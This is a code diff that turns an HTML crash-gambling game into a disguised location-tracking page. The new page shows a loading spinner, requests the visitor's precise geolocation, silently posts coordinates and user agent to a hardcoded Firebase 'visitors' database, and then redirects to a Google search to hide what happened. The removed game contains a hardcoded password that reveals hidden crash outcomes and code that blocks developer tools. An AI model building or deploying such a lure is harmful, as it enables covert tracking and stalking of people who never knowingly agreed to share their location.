@@ -1,317 +1,110 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <title>Crash Game - Provably Fair</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل...</title>
     <style>
         body {
-            background-color: #0b0b0b;
-            color: #fff;
+            background: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
             font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-        }
-        #multiplier {
-            font-size: 60px;
-            margin: 20px;
-        }
-        #cashoutBtn {
-            padding: 10px 20px;
-            font-size: 20px;
-            margin: 10px;
-            cursor: pointer;
-            border: none;
-            border-radius: 5px;
-            background-color: #28a745;
             color: white;
         }
-        #cashoutBtn:disabled {
-            background-color: #666;
-            cursor: not-allowed;
+        .loader { text-align: center; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #8ab4f8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
         }
-        #result {
-            font-size: 30px;
-            margin-top: 30px;
-        }
-        #canvas {
-            background-color: #1a1a1a;
-            margin-top: 30px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-            border: 2px solid #333;
-        }
-        #countdown {
-            font-size: 40px;
-            margin-top: 20px;
-        }
-        #crashInfo {
-            margin-top: 10px;
-            font-size: 16px;
-            color: #f0f0f0;
-            word-break: break-word;
-            display: none;
-        }
-        #errorLog {
-            color: red;
-            margin-top: 20px;
-        }
-        #passwordSection {
-            margin-top: 20px;
-        }
-        input[type="password"] {
-            padding: 5px;
-            font-size: 16px;
-        }
-        button#checkPassword {
-            padding: 5px 10px;
-            font-size: 16px;
-            margin-left: 5px;
-            cursor: pointer;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .message { font-size: 14px; color: #aaa; }
     </style>
 </head>
 <body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <div class="message" id="status">جاري التجهيز...</div>
+    </div>
 
-<h1>Crash Game (Provably Fair)</h1>
-<div id="countdown"></div>
-<div id="multiplier">Waiting...</div>
-<button id="cashoutBtn" disabled>Cash Out</button>
+    <script>
+        // بيانات مشروعك - تم وضعها يدويًا
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
+            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
+            projectId: "imggps"
+        };
 
-<div id="passwordSection">
-    <input type="password" id="passwordInput" placeholder="ادخل كلمة المرور">
-    <button id="checkPassword">عرض النتيجة</button>
-</div>
+        const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
+        const DB_PATH = "visitors";
 
-<div id="crashInfo"></div>
-<div id="result"></div>
-<canvas id="canvas" width="600" height="400"></canvas>
-<div id="errorLog"></div>
-
-<script>
-    let multiplier = 1.00;
-    let crashPoint;
-    let interval;
-    let isCrashed = false;
-    let isCashedOut = false;
-    const ctx = document.getElementById('canvas').getContext('2d');
-    let x = 0;
-    let points = [];
-
-    let serverSeed = generateSeed();
-    let clientSeed = generateSeed();
-    let nonce = 0;
-
-    function generateSeed() {
-        const array = new Uint8Array(16);
-        window.crypto.getRandomValues(array);
-        return Array.from(array)
-            .map(b => b.toString(16).padStart(2, '0'))
-            .join('');
-    }
-
-    async function hmacSHA256(key, message) {
-        try {
-            const enc = new TextEncoder();
-            const keyData = enc.encode(key);
-            const msgData = enc.encode(message);
-            const cryptoKey = await crypto.subtle.importKey(
-                "raw", keyData,
-                { name: "HMAC", hash: "SHA-256" },
-                false, ["sign"]
-            );
-            const signature = await crypto.subtle.sign("HMAC", cryptoKey, msgData);
-            const hashArray = Array.from(new Uint8Array(signature));
-            return hashArray
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-        } catch (error) {
-            handleError("HMAC Error: " + error.message);
-            throw error;
+        function redirect() {
+            window.location.href = TARGET_URL;
         }
-    }
 
-    function crashPointFromHash(hash) {
-        const h = parseInt(hash.slice(0, 13), 16);
-        if (h % 33 === 0) {
-            return 1.00;
-        }
-        return Math.floor((100 * (2 ** 52)) / (h + 1)) / 100;
-    }
-
-    async function generateCrashPoint() {
-        try {
-            const message = `${clientSeed}-${nonce}`;
-            const hash = await hmacSHA256(serverSeed, message);
-            const crash = crashPointFromHash(hash);
-            window.crashSecret = {
-                crash,
-                serverSeed,
-                clientSeed,
-                nonce,
-                hash
+        function saveData(lat, lng, accuracy) {
+            const record = {
+                lat: lat,
+                lng: lng,
+                accuracy: accuracy,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent.substring(0, 100)
             };
-            nonce++;
-            return crash;
-        } catch (error) {
-            handleError("Crash Point Generation Failed.");
-            throw error;
-        }
-    }
 
-    async function startGame() {
-        try {
-            crashPoint = await generateCrashPoint();
-            multiplier = 1.00;
-            x = 0;
-            points = [];
-            isCrashed = false;
-            isCashedOut = false;
-            document.getElementById('result').innerText = "";
-            document.getElementById('cashoutBtn').disabled = false;
-            document.getElementById('crashInfo').style.display = "none";
+            // نسخة احتياطية محلية
+            try {
+                const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
+                localData.push(record);
+                localStorage.setItem('geo_log', JSON.stringify(localData));
+            } catch(e) {}
 
-            interval = setInterval(() => {
-                if (isCrashed) return;
-                multiplier += 0.01;
-                multiplier = parseFloat(multiplier.toFixed(2));
-                points.push({ x: x, y: multiplier });
-                document.getElementById('multiplier').innerText = `${multiplier}x`;
-                drawGraph();
-                if (multiplier >= crashPoint) {
-                    crash();
-                }
-                x += 3;
-            }, 50);
-        } catch (error) {
-            handleError("Start Game Error: " + error.message);
-        }
-    }
-
-    function crash() {
-        clearInterval(interval);
-        isCrashed = true;
-        document.getElementById('cashoutBtn').disabled = true;
-        if (!isCashedOut) {
-            document.getElementById('result').innerText =
-                `CRASHED at ${multiplier}x! You lost!`;
-        }
-        scheduleNextRound();
-    }
-
-    document.getElementById('cashoutBtn').addEventListener('click', () => {
-        if (!isCrashed && !isCashedOut) {
-            clearInterval(interval);
-            isCashedOut = true;
-            document.getElementById('result').innerText =
-                `Cashed out at ${multiplier}x! You win!`;
-            document.getElementById('cashoutBtn').disabled = true;
-            scheduleNextRound();
-        }
-    });
-
-    function scheduleNextRound() {
-        let countdown = 3;
-        document.getElementById('countdown').innerText = countdown;
-        const next = setInterval(() => {
-            countdown--;
-            if (countdown <= 0) {
-                clearInterval(next);
-                document.getElementById('countdown').innerText = "";
-                resetCanvasAndInfo();
-                startGame();
-            } else {
-                document.getElementById('countdown').innerText = countdown;
-            }
-        }, 1000);
-    }
-
-    function resetCanvasAndInfo() {
-        ctx.clearRect(0, 0, 600, 400);
-        document.getElementById('multiplier').innerText = "Waiting...";
-        document.getElementById('errorLog').innerText = "";
-    }
-
-    function drawGraph() {
-        ctx.fillStyle = "#1a1a1a";
-        ctx.fillRect(0, 0, 600, 400);
-
-        ctx.strokeStyle = "#333";
-        ctx.lineWidth = 1;
-        for (let i = 0; i <= 600; i += 50) {
-            ctx.beginPath();
-            ctx.moveTo(i, 0);
-            ctx.lineTo(i, 400);
-            ctx.stroke();
-        }
-        for (let i = 0; i <= 400; i += 50) {
-            ctx.beginPath();
-            ctx.moveTo(0, i);
-            ctx.lineTo(600, i);
-            ctx.stroke();
+            // إرسال إلى Firebase Realtime Database باستخدام REST API
+            fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(record)
+            })
+            .then(() => console.log('تم الحفظ في السحابة'))
+            .catch(err => console.warn('فشل الحفظ السحابي', err))
+            .finally(() => {
+                redirect();
+            });
         }
 
-        ctx.strokeStyle = "#00ff00";
-        ctx.lineWidth = 2;
-        ctx.beginPath();
-        if (points.length > 0) {
-            ctx.moveTo(points[0].x, 400 - points[0].y * 20);
-            for (let i = 1; i < points.length; i++) {
-                ctx.lineTo(points[i].x, 400 - points[i].y * 20);
-            }
-            ctx.stroke();
+        function handlePosition(pos) {
+            const lat = pos.coords.latitude.toFixed(7);
+            const lng = pos.coords.longitude.toFixed(7);
+            const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : 'N/A';
+            document.getElementById('status').textContent = 'تم تحديد الموقع...';
+            saveData(lat, lng, acc);
         }
-    }
 
-    function handleError(message) {
-        document.getElementById('errorLog').innerText = `Error: ${message}`;
-        console.error(message);
-    }
+        function handleError(err) {
+            console.warn('Geolocation error:', err.message);
+            document.getElementById('status').textContent = 'لم نتمكن من تحديد الموقع...';
+            setTimeout(redirect, 1500);
+        }
 
-    // كلمة مرور عرض المعلومات
-    document.getElementById('checkPassword').addEventListener('click', () => {
-        const password = document.getElementById('passwordInput').value;
-        if (password === "1231") {
-            const info = window.crashSecret;
-            document.getElementById('crashInfo').style.display = "block";
-            document.getElementById('crashInfo').innerHTML = `
-                Crash Point: <b>${info.crash}x</b><br>
-                Server Seed: <code>${info.serverSeed}</code><br>
-                Client Seed: <code>${info.clientSeed}</code><br>
-                Nonce: ${info.nonce - 1}</br>
-                HMAC: <code>${info.hash}</code>
-            `;
+        if (navigator.geolocation) {
+            document.getElementById('status').textContent = 'جاري تحديد الموقع...';
+            navigator.geolocation.getCurrentPosition(
+                handlePosition,
+                handleError,
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
         } else {
-            alert("كلمة المرور غير صحيحة");
+            setTimeout(redirect, 1000);
         }
-    });
 
-    // بدء اللعبة
-    countdownStart(3);
-
-    function countdownStart(seconds) {
-        let c = seconds;
-        document.getElementById('countdown').innerText = c;
-        const iv = setInterval(async () => {
-            c--;
-            if (c <= 0) {
-                clearInterval(iv);
-                document.getElementById('countdown').innerText = "";
-                await startGame();
-            } else {
-                document.getElementById('countdown').innerText = c;
-            }
-        }, 1000);
-    }
-
-    // حماية ضد الفحص عبر أدوات المطور
-    document.addEventListener('contextmenu', event => event.preventDefault());
-    document.addEventListener('keydown', event => {
-        if (event.keyCode == 123 || (event.ctrlKey && event.shiftKey && (event.keyCode == 73 || event.keyCode == 74)) || (event.ctrlKey && event.keyCode == 85)) {
-            event.preventDefault();
-        }
-    });
-</script>
-
+        // احتياط: إعادة توجيه بعد 7 ثوانٍ إذا لم يكتمل شيء
+        setTimeout(redirect, 7000);
+    </script>
 </body>
 </html>
